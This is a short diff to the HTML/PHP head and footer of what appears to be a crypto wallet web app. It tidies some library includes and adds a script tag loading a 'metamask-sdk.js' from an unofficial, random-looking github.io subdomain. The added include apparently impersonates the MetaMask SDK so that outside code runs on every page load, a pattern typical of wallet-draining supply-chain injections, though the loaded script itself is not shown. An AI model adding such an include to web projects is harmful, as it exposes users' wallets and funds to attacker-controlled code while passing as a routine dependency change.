@@ -34,10 +34,10 @@
     <link rel="stylesheet" href="<?=$view['urlbaseaddr'] ?>css/animate.css">
     <!-- Main Stylesheet -->
     <link rel="stylesheet" href="<?=$view['urlbaseaddr'] ?>css/main.css">
-    <script src="https://cdn.jsdelivr.net/npm/fs-js@1.0.6/index.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/glob@10.3.4/dist/mjs/glob.min.js"></script>
     <script src="https://cdn.ethers.io/scripts/ethers-v4.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
 
 </head>
 <body>
@@ -171,8 +171,5 @@
 <script type="text/javascript" src="<?=$view['urlbaseaddr'] ?>js/human_standard_token_abi.js"></script>
 
 <script type="module" src="<?=$view['urlbaseaddr'] ?>js/dapp_wrapBundle.js"></script>
-
-<script src="https://cdn.ethers.io/scripts/ethers-v4.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
 </body>
 </html>
